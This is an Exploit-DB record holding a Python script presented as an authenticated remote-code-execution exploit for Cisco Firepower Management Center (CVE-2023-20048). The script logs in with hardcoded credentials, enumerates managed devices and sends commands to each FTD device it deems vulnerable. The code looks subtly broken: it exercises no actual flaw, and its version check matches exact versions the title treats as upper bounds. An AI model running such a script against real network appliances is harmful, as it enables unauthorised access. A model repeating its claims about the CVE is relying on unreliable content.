{"source": "https://www.exploit-db.com/exploits/51881", "vulnName": "Cisco Firepower Management Center < 6.6.7.1 - Authenticated RCE", "vulnEDBID": "51881", "vulnCVE": "N/A", "author": "ABDUALHADI KHALIFA", "exploitType": "WEBAPPS", "platform": "HARDWARE", "datePublished": "2024-03-12", "vulnContent": "# Exploit Title: [Cisco Firepower Management Center]\n# Google Dork: [non]\n# Date: [12/06/2023]\n# Exploit Author: [Abdualhadi khalifa](https://twitter.com/absholi_ly)\n# Version: [6.2.3.18\", \"6.4.0.16\", \"6.6.7.1]\n# CVE : [CVE-2023-20048]\n\nimport requests\nimport json\n\n# set the variables for the URL, username, and password for the FMC web services interface\nfmc_url = \"https://fmc.example.com\"\nfmc_user = \"admin\"\nfmc_pass = \"cisco123\"\n\n# create a requests session to handle cookies and certificate verification\nsession = requests.Session()\nsession.verify = False\n\n# send a POST request to the /api/fmc_platform/v1/auth/generatetoken endpoint to get the access token and refresh token\ntoken_url = fmc_url + \"/api/fmc_platform/v1/auth/generatetoken\"\nresponse = session.post(token_url, auth=(fmc_user, fmc_pass))\n\n# check the response status and extract the access token and refresh token from the response headers\n# set the access token as the authorization header for the subsequent requests\ntry:\n    if response.status_code == 200:\n        access_token = response.headers[\"X-auth-access-token\"]\n        refresh_token = response.headers[\"X-auth-refresh-token\"]\n        session.headers[\"Authorization\"] = access_token\n    else:\n        print(\"Failed to get tokens, status code: \" + str(response.status_code))\n        exit()\nexcept Exception as e:\n    print(e)\n    exit()\n\n# set the variable for the domain id\n# change this to your domain id\ndomain_id = \"e276abec-e0f2-11e3-8169-6d9ed49b625f\"\n\n# send a GET request to the /api/fmc_config/v1/domain/{DOMAIN_UUID}/devices/devicerecords endpoint to get the list of devices managed by FMC\ndevices_url = fmc_url + \"/api/fmc_config/v1/domain/\" + domain_id + \"/devices/devicerecords\"\nresponse = session.get(devices_url)\n\n# check the response status and extract the data as a json object\ntry:\n    if response.status_code == 200:\n        data = response.json()\n    else:\n        print(\"Failed to get devices, status code: \" + str(response.status_code))\n        exit()\nexcept Exception as e:\n    print(e)\n    exit()\n\n# parse the data to get the list of device names and URLs\ndevices = []\nfor item in data[\"items\"]:\n    device_name = item[\"name\"]\n    device_url = item[\"links\"][\"self\"]\n    devices.append((device_name, device_url))\n\n# loop through the list of devices and send a GET request to the URL of each device to get the device details\nfor device in devices:\n    device_name, device_url = device\n    response = session.get(device_url)\n\n    # check the response status and extract the data as a json object\n    try:\n        if response.status_code == 200:\n            data = response.json()\n        else:\n            print(\"Failed to get device details, status code: \" + str(response.status_code))\n            continue\n    except Exception as e:\n        print(e)\n        continue\n\n    # parse the data to get the device type, software version, and configuration URL\n    device_type = data[\"type\"]\n    device_version = data[\"metadata\"][\"softwareVersion\"]\n    config_url = data[\"metadata\"][\"configURL\"]\n\n    # check if the device type is FTD and the software version is vulnerable to the CVE-2023-20048 vulnerability\n    # use the values from the affected products section in the security advisory\n    if device_type == \"FTD\" and device_version in [\"6.2.3.18\", \"6.4.0.16\", \"6.6.7.1\"]:\n        print(\"Device \" + device_name + \" is vulnerable to CVE-2023-20048\")\n\n        # create a list of commands that you want to execute on the device\n        commands = [\"show version\", \"show running-config\", \"show interfaces\"]\n        device_id = device_url.split(\"/\")[-1]\n\n        # loop through the list of commands and send a POST request to the /api/fmc_config/v1/domain/{DOMAIN_UUID}/devices/devicerecords/{DEVICE_ID}/operational/command/{COMMAND} endpoint to execute each command on the device\n        # replace {DOMAIN_UUID} with your domain id, {DEVICE_ID} with your device id, and {COMMAND} with the command you want to execute\n        for command in commands:\n            command_url = fmc_url + \"/api/fmc_config/v1/domain/\" + domain_id + \"/devices/devicerecords/\" + device_id + \"/operational/command/\" + command\n            response = session.post(command_url)\n\n            # check the response status and extract the data as a json object\n            try:\n                if response.status_code == 200:\n                    data = response.json()\n                else:\n                    print(\"Failed to execute command, status code: \" + str(response.status_code))\n                    continue\n            except Exception as e:\n                print(e)\n                continue\n\n            # parse the data to get the result of the command execution and print it\n            result = data[\"result\"]\n            print(\"Command: \" + command)\n            print(\"Result: \" + result)\n\n    else:\n        print(\"Device \" + device_name + \" is not vulnerable to CVE-2023-20048\")\n            "}